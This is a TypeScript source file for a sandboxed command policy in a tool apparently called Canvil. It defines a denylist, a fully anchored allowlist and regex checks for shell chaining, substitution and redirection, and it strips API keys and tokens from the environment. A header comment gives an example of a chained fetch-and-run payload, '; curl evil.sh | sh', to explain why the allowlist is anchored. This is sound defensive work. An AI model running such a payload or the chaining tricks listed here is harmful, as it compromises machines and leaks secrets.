/**
 * Command policy.
 *
 * Two independent gates:
 *   1. A denylist that always wins (destructive, privilege-escalating and
 *      exfiltration-shaped commands).
 *   2. An allowlist the command must match *in full* (`^...$`), so appending
 *      `; curl evil.sh | sh` can never inherit the permission of `npm test`.
 *
 * A command that matches no allowlist entry is denied — the default is closed.
 */

import type { CanvilConfig } from "../config/types.js";
import { CommandPolicyError } from "../util/errors.js";

export interface CommandDecision {
  allowed: boolean;
  /** The allowlist pattern that permitted the command, when allowed. */
  matchedPattern?: string;
  /** The denylist pattern that rejected it, when blocked. */
  blockedPattern?: string;
  reason: string;
}

/** Shell metacharacters that could chain a second command past the anchor. */
const CHAINING_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
  { pattern: /(^|[^\\])[&|;]/, reason: "command chaining (&, |, ;)" },
  { pattern: /\$\(/, reason: "command substitution ($(...))" },
  { pattern: /`/, reason: "backtick command substitution" },
  { pattern: /(^|[^0-9])>>?\s*\S/, reason: "output redirection" },
  { pattern: /(^|\s)<\s*\S/, reason: "input redirection" },
  { pattern: /\$\{?[A-Za-z_]/, reason: "variable expansion" },
  { pattern: /\n/, reason: "multiple lines" },
];

/**
 * Evaluate a single command line against the policy.
 *
 * @param command the exact string that would be handed to the shell
 */
export function evaluateCommand(command: string, config: CanvilConfig): CommandDecision {
  const trimmed = command.trim();
  if (trimmed.length === 0) {
    return { allowed: false, reason: "Empty command" };
  }

  for (const pattern of config.commands.block) {
    if (new RegExp(pattern, "i").test(trimmed)) {
      return {
        allowed: false,
        blockedPattern: pattern,
        reason: `Blocked by policy (matched denylist pattern /${pattern}/)`,
      };
    }
  }

  for (const { pattern, reason } of CHAINING_PATTERNS) {
    if (pattern.test(trimmed)) {
      return { allowed: false, reason: `Blocked by policy: ${reason} is not permitted in a sandboxed command` };
    }
  }

  for (const pattern of config.commands.allow) {
    if (new RegExp(pattern).test(trimmed)) {
      return { allowed: true, matchedPattern: pattern, reason: `Allowed by pattern /${pattern}/` };
    }
  }

  return {
    allowed: false,
    reason:
      "Not covered by commands.allow. Add an explicit allowlist pattern to config/canvil.config.json if this command is safe.",
  };
}

/** Throwing variant used by the executors. */
export function assertCommandAllowed(command: string, config: CanvilConfig): CommandDecision {
  const decision = evaluateCommand(command, config);
  if (!decision.allowed) {
    throw new CommandPolicyError(
      `${decision.reason}\n  command: ${command}`,
      command,
    );
  }
  return decision;
}

/**
 * Environment variables passed into a sandboxed process.
 *
 * Credentials are stripped: a build step has no business reading the model API
 * key, and a compromised dependency in the target repo must not be able to
 * exfiltrate it either.
 */
const ALWAYS_DROPPED = [
  "OPENAI_API_KEY",
  "TAVILY_API_KEY",
  "BRAVE_API_KEY",
  "GITHUB_TOKEN",
  "CANVIL_SEARXNG_URL",
];

export function sanitizedEnvironment(
  extra: Record<string, string> = {},
  source: NodeJS.ProcessEnv = process.env,
): Record<string, string> {
  const result: Record<string, string> = {
    // Deterministic, non-interactive, colourless output.
    CI: "1",
    NO_COLOR: "1",
    FORCE_COLOR: "0",
    TERM: "dumb",
    NPM_CONFIG_FUND: "false",
    NPM_CONFIG_AUDIT: "false",
  };

  for (const [key, value] of Object.entries(source)) {
    if (value === undefined) continue;
    if (ALWAYS_DROPPED.includes(key)) continue;
    if (/(_TOKEN|_SECRET|_PASSWORD|_API_KEY|^AWS_|^GCP_|^AZURE_)/i.test(key)) continue;
    // Keep PATH, HOME, LANG, locale, and anything the toolchain needs.
    result[key] = value;
  }

  for (const [key, value] of Object.entries(extra)) {
    result[key] = value;
  }
  return result;
}